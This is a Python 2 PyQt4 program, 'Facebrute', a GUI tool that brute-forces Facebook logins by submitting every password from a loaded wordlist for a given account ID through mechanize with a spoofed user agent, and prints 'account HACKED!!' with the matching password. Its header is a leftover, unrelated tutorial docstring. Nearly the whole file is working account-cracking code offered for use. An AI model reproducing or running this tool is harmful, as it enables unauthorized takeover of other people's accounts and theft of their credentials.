#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
ZetCode PyQt4 tutorial

In this example, we create a simple
window in PyQt4.

author: Jan Bodnar
website: zetcode.com
last edited: October 2011
"""

import sys, os, random, mechanize, cookielib
from PyQt4 import QtGui, QtCore

class Facebrute(QtGui.QMainWindow):

    def __init__(self):
        super(Facebrute, self).__init__()

        self.initUI()

    def initUI(self):

        #default variables value
        self.passwords = False

        self.setToolTip('Facebrute by P0cL4bs Team')

        self.createFacebookAccount()
        self.createWordlistUpload()
        self.createResult()

        # Crack facebook account button
        self.btnCrack = QtGui.QPushButton('Crack Account', self)
        self.btnCrack.resize(self.btnCrack.sizeHint())
        self.btnCrack.clicked.connect(self.crack)
        self.btnCrack.move(10,150)

        self.setGeometry(300, 300, 260, 450)
        self.setWindowTitle('Facebrute')
        self.show()

    def createFacebookAccount(self):
        # Facebook account ID Label
        lbfacebookId = QtGui.QLabel('Facebook ID', self)
        lbfacebookId.move(10, 10)

        # Facebook account ID TextEdit
        self.txtfacebookId = QtGui.QTextEdit('', self)
        self.txtfacebookId.resize(240, 30)
        self.txtfacebookId.move(10,40)

    def createWordlistUpload(self):

        # Wordlist upload Label
        lbWordlist = QtGui.QLabel('Wordlist', self)
        lbWordlist.move(10, 70)

        # Wordlist upload TextEdit
        self.txtUploadEdit = QtGui.QTextEdit('', self)
        self.txtUploadEdit.resize(150, 30)
        self.txtUploadEdit.move(10,100)

        # Wordlist upload Button
        self.btnUploadWordlist = QtGui.QPushButton('Upload', self)
        self.btnUploadWordlist.setToolTip('Click this for upload Wordlist')
        self.btnUploadWordlist.resize(self.btnUploadWordlist.sizeHint())
        self.btnUploadWordlist.clicked.connect(self.showDialog)
        self.btnUploadWordlist.move(170,100)

    def createResult(self):

        # Result Label
        lbWordlist = QtGui.QLabel('Result', self)
        lbWordlist.move(10, 190)

        # Result TextEdit
        self.txtResult = QtGui.QTextEdit('', self)
        self.txtResult.resize(240, 200)
        self.txtResult.move(10,220)

    def showDialog(self):

        fname = QtGui.QFileDialog.getOpenFileName(self, 'Open file', '/home')
        f = open(fname, 'r')

        with f:
            self.passwords = f.readlines()
            name = os.path.basename(str(f.name))
            self.txtUploadEdit.setText(name)

    def crack(self):
        if self.passwords:
            self.crackFacebookAccount()
        else:
            self.alert("Please select the wordlist first")

    def alert(self,  message):
        alert = QtGui.QMessageBox()
        alert.setText(str(message))
        alert.exec_()

    def crackFacebookAccount(self):

        self.br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        self.br.set_handle_robots(False)
        self.br.set_handle_equiv(True)
        self.br.set_handle_referer(True)
        self.br.set_handle_redirect(True)
        self.br.set_cookiejar(cj)
        self.br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

        k = 0
        while k < len(self.passwords):
           self.passwords[k] = self.passwords[k].strip()
           k += 1

        for password in self.passwords:
            self.attack(password.replace("\n",""))

    def attack(self, password):

        useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
        login = 'https://www.facebook.com/login.php?login_attempt=1'

        sys.stdout.write("\r[*] trying %s.. " % password)
        sys.stdout.flush()

        self.br.addheaders = [('User-agent', random.choice(useragents))]

        site = self.br.open(login)

        self.br.select_form(nr=0)

        # Facebook login test
        self.br.form['email'] = self.txtfacebookId.toPlainText()
        self.br.form['pass'] = password
        self.br.submit()

        log = self.br.geturl()
        if log != login:
            self.txtResult.append("\n\n\n [*] account HACKED!!\n [*] Password : %s\n" % (password))
            print "\n\n\n [*] account HACKED .. !!"
            print "\n [*] Password : %s\n" % (password)
            self.br.select_form(nr=0)

def main():

    app = QtGui.QApplication(sys.argv)
    fb = Facebrute()

    sys.exit(app.exec_())


if __name__ == '__main__':
    main()
